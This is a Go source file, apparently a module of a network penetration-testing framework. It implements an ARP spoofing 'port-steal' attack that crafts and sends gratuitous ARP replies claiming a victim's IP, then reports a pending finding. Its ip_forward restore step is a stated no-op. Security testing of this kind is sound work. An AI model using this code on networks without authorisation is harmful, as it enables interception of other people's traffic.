// portsteal.go implements the port-steal ARP spoofing attack.
//
// Durability (from the catalog):
//   - Default: transient-decay. The attack sends gratuitous ARP replies
//     with the attacker's MAC, causing the switch to associate the target's
//     IP with the attacker's port. The CAM entry ages out after the attack.
//   - --relay: temporary-restored. The attack enables IP forwarding on the
//     attacker (to relay traffic between victim and gateway) and arms a
//     teardown step to restore ip_forward to its original state.

package l2

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type portStealFinding struct {
	Action  string `json:"action"`
	Target  string `json:"target"`
	Restore string `json:"restore"`
}

// RunPortSteal sends three gratuitous ARP replies claiming the target's
// victim IP at the attack leg's MAC. The relay mode arms an ip_forward
// restore step that does no host work yet. The verdict is pending: whether
// the switch moved the victim's port needs a probe it does not have.
func RunPortSteal(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	target := deps.Target.Victim.IP

	frameCount := 3
	restoreArmed := "no"
	if deps.Entry.Restore.Kind == check.RestoreActive {
		deps.Teardown.Arm("ip-forward-restore", func(_ context.Context) error {
			// Restoring the original ip_forward sysctl value is host-side
			// state with no wire effect. The in-memory harness sees the
			// restore through the teardown step name.
			return nil
		})
		restoreArmed = "yes"
	}

	for i := 0; i < frameCount; i++ {
		pkt, err := craftPortStealARP(src, target)
		if err != nil {
			return check.Verdict{}, errs.Wrapf(err, "portsteal: craft frame %d", i)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return check.Verdict{}, errs.Wrapf(err, "portsteal: send frame %d", i)
		}
	}

	detail, _ := json.Marshal(portStealFinding{
		Action:  "port-steal",
		Target:  target.String(),
		Restore: restoreArmed,
	})
	deps.Emitter.Finding("arp", detail)

	if restoreArmed == "yes" {
		return check.Pending("no observable: port move needs a probe of the victim, and the ip-forward-restore step is a no-op"), nil
	}
	return check.Pending("no observable: port move needs a probe of the victim"), nil
}

// craftPortStealARP builds a gratuitous ARP reply: the attacker announces
// the target's IP with the attacker's MAC.
func craftPortStealARP(src net.HardwareAddr, target net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       broadcastMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1, // Ethernet
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // ARP reply
		SourceHwAddress:   src,
		SourceProtAddress: target.To4(),
		DstHwAddress:      broadcastMAC,
		DstProtAddress:    target.To4(),
	}
	return craft.Default(eth, arp)
}
